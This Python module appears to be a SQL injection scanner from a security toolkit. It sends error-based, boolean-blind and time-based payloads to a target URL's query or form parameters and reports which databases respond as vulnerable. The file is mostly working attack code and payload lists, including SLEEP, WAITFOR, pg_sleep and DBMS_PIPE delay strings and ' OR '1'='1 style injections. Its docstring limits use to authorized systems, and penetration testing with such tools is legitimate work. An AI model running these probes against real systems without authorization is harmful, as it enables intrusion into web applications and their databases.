"""
sqli_test.py — SQL injection parameter tester.

Tests URL parameters and form fields for SQL injection vulnerabilities:
  • Error-based: looks for database error strings in responses
  • Boolean-based blind: compares true/false condition responses
  • Time-based blind: measures response delays from SLEEP/WAITFOR payloads
  • Union-based: attempts to detect column count via ORDER BY

Does NOT write to or delete from databases.
Use only on systems you own or have explicit written authorization to test.
"""

from __future__ import annotations

import re
import time
import urllib.parse
import urllib.request
import urllib.error
from typing import Optional

# Error signatures by database
DB_ERROR_PATTERNS = {
    "MySQL": [
        r"You have an error in your SQL syntax",
        r"Warning: mysql_",
        r"MySQL server version for the right syntax",
        r"MySQLSyntaxErrorException",
        r"com\.mysql\.jdbc",
        r"Unclosed quotation mark",
        r"ERROR 1064",
        r"ERROR 1146",
    ],
    "PostgreSQL": [
        r"pg_query\(\): Query failed",
        r"pg_exec\(\) query failed",
        r"PSQLException",
        r"ERROR:\s+syntax error at or near",
        r"ERROR:\s+unterminated quoted string",
        r"org\.postgresql",
    ],
    "MSSQL": [
        r"Unclosed quotation mark after the character string",
        r"Microsoft OLE DB Provider for SQL Server",
        r"ODBC SQL Server Driver",
        r"SQLServer JDBC Driver",
        r"SqlException",
        r"System\.Data\.SqlClient\.",
        r"\[Microsoft\]\[ODBC SQL Server Driver\]",
        r"Incorrect syntax near",
    ],
    "Oracle": [
        r"ORA-\d+:",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning: oci_",
        r"quoted string not properly terminated",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver",
        r"System\.Data\.SQLite",
        r"sqlite3\.OperationalError",
        r"SQLite3::query\(\)",
    ],
    "Generic": [
        r"SQL syntax",
        r"database error",
        r"SQLSTATE",
        r"Syntax error.*SQL",
        r"unterminated string",
    ],
}

# fmt: off
PAYLOADS = {
    "error": [
        "'", "\"", "`", "\\", "'--", "\"--", "' OR '1'='1",
        "' OR '1'='1'--", "\" OR \"1\"=\"1",
        "1' ORDER BY 1--", "1' ORDER BY 100--",
        "1 AND 1=1", "1 AND 1=2",
        "'; SELECT 1--", "'; WAITFOR DELAY '0:0:0'--",
        "1' AND 1=CONVERT(int,'a')--",
    ],
    "boolean": [
        ("' AND '1'='1", "' AND '1'='2"),
        ("1 AND 1=1", "1 AND 1=2"),
        ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
        ("' OR 1=1--", "' OR 1=2--"),
    ],
    "time": [
        # MySQL
        "' AND SLEEP(3)--",
        "\" AND SLEEP(3)--",
        "1 AND SLEEP(3)",
        # MSSQL
        "'; WAITFOR DELAY '0:0:3'--",
        "1; WAITFOR DELAY '0:0:3'--",
        # PostgreSQL
        "'; SELECT pg_sleep(3)--",
        "\" AND 1=(SELECT 1 FROM pg_sleep(3))--",
        # Oracle
        "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--",
    ],
}
# fmt: on

SLEEP_THRESHOLD = 2.5  # seconds


def execute(
    url: str,
    params: list = None,
    method: str = "GET",
    post_data: dict = None,
    test_types: list = None,
    timeout: int = 10,
    cookies: str = "",
    user_agent: str = "",
    custom_headers: dict = None,
    max_params: int = 20,
    **kwargs,
) -> dict:
    """
    Test URL for SQL injection.

    params: specific parameter names to test (auto-detects from URL if empty)
    test_types: ["error", "boolean", "time"] — default: all three
    method: GET or POST
    post_data: {param: value} for POST testing
    """
    start = time.time()

    if not url.startswith("http"):
        url = "https://" + url

    test_types = test_types or ["error", "boolean", "time"]

    ua = user_agent or "Mozilla/5.0 (compatible; SQLTest/1.0)"
    hdrs = {"User-Agent": ua, "Accept": "*/*"}
    if cookies:
        hdrs["Cookie"] = cookies
    if custom_headers:
        hdrs.update(custom_headers)

    # Parse URL and extract params
    parsed = urllib.parse.urlparse(url)
    qs_params = dict(urllib.parse.parse_qsl(parsed.query))

    if params:
        target_params = {p: qs_params.get(p, "1") for p in params}
    elif qs_params:
        target_params = dict(list(qs_params.items())[:max_params])
    elif method.upper() == "POST" and post_data:
        target_params = dict(list(post_data.items())[:max_params])
    else:
        return _err("No parameters found to test. Provide params= or include query parameters in the URL.", start)

    base_url = urllib.parse.urlunparse(parsed._replace(query=""))

    vulnerabilities: list[dict] = []
    tested_params = []
    tested_count = 0

    for param, original_value in target_params.items():
        tested_params.append(param)

        # Baseline response
        baseline = _make_request(
            base_url, method, {**qs_params, **{param: original_value or "1"}},
            hdrs, timeout, post_data,
        )
        if baseline is None:
            continue

        # Error-based
        if "error" in test_types:
            for payload in PAYLOADS["error"]:
                tested_count += 1
                test_params = {**qs_params, param: str(original_value) + payload}
                resp = _make_request(base_url, method, test_params, hdrs, timeout, post_data)
                if resp is None:
                    continue
                db_type, error = _detect_db_error(resp["body"])
                if db_type:
                    vulnerabilities.append({
                        "type": "error_based",
                        "severity": "critical",
                        "param": param,
                        "payload": payload,
                        "database": db_type,
                        "error_snippet": error[:200],
                        "description": f"SQL error-based injection in parameter '{param}'",
                    })
                    break  # Found, move to next param

        # Boolean-based blind
        if "boolean" in test_types and not any(v["param"] == param and v["type"] == "error_based" for v in vulnerabilities):
            for true_p, false_p in PAYLOADS["boolean"]:
                tested_count += 2
                true_resp = _make_request(base_url, method, {**qs_params, param: str(original_value) + true_p}, hdrs, timeout, post_data)
                false_resp = _make_request(base_url, method, {**qs_params, param: str(original_value) + false_p}, hdrs, timeout, post_data)
                if true_resp is None or false_resp is None:
                    continue
                if _responses_differ(baseline["body"], true_resp["body"], false_resp["body"]):
                    vulnerabilities.append({
                        "type": "boolean_blind",
                        "severity": "critical",
                        "param": param,
                        "payload_true": true_p,
                        "payload_false": false_p,
                        "description": f"Boolean-based blind SQL injection in parameter '{param}'",
                    })
                    break

        # Time-based blind
        if "time" in test_types and not any(v["param"] == param for v in vulnerabilities):
            for payload in PAYLOADS["time"]:
                tested_count += 1
                test_params = {**qs_params, param: str(original_value) + payload}
                t0 = time.time()
                resp = _make_request(base_url, method, test_params, hdrs, timeout + 5, post_data)
                elapsed = time.time() - t0
                if elapsed >= SLEEP_THRESHOLD:
                    vulnerabilities.append({
                        "type": "time_based_blind",
                        "severity": "critical",
                        "param": param,
                        "payload": payload,
                        "delay_seconds": round(elapsed, 2),
                        "description": f"Time-based blind SQL injection in parameter '{param}' (delay: {elapsed:.1f}s)",
                    })
                    break

    return {
        "status": "ok",
        "result": {
            "url": url,
            "method": method,
            "params_tested": tested_params,
            "requests_sent": tested_count,
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerability_count": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
        },
        "error": None,
        "metadata": {"tool": "sqli_test", "duration_ms": _ms(start)},
    }


def _make_request(url, method, params, headers, timeout, post_data=None):
    try:
        if method.upper() == "POST":
            data = urllib.parse.urlencode({**(post_data or {}), **params}).encode()
            req = urllib.request.Request(url, data=data, headers=headers, method="POST")
        else:
            qs = urllib.parse.urlencode(params)
            full_url = f"{url}?{qs}" if qs else url
            req = urllib.request.Request(full_url, headers=headers, method="GET")

        t0 = time.time()
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read(30000).decode("utf-8", errors="replace")
            return {"status": resp.status, "body": body, "elapsed": time.time() - t0}
    except urllib.error.HTTPError as e:
        body = ""
        try:
            body = e.read(10000).decode("utf-8", errors="replace")
        except Exception:
            pass
        return {"status": e.code, "body": body, "elapsed": 0}
    except Exception:
        return None


def _detect_db_error(body: str) -> tuple[str, str]:
    for db_type, patterns in DB_ERROR_PATTERNS.items():
        for pattern in patterns:
            m = re.search(pattern, body, re.I)
            if m:
                start_idx = max(0, m.start() - 30)
                end_idx = min(len(body), m.end() + 100)
                return db_type, body[start_idx:end_idx]
    return "", ""


def _responses_differ(baseline: str, true_resp: str, false_resp: str) -> bool:
    # Check if true response is more similar to baseline than false response
    def similarity(a: str, b: str) -> float:
        if not a or not b:
            return 0.0
        la, lb = len(a), len(b)
        diff = abs(la - lb)
        max_len = max(la, lb)
        return 1.0 - (diff / max_len) if max_len > 0 else 1.0

    sim_true = similarity(baseline, true_resp)
    sim_false = similarity(baseline, false_resp)

    # True response matches baseline, false doesn't
    if sim_true > 0.95 and sim_false < 0.85:
        return True
    # Large difference between true and false
    if abs(sim_true - sim_false) > 0.2:
        return True
    # Content length differs significantly
    if abs(len(true_resp) - len(false_resp)) > 100:
        true_diff = abs(len(baseline) - len(true_resp))
        false_diff = abs(len(baseline) - len(false_resp))
        if false_diff > 200 and true_diff < false_diff * 0.5:
            return True
    return False


def _err(msg, start):
    return {
        "status": "error", "result": None, "error": msg,
        "metadata": {"tool": "sqli_test", "duration_ms": _ms(start)},
    }


def _ms(start):
    return int((time.time() - start) * 1000)
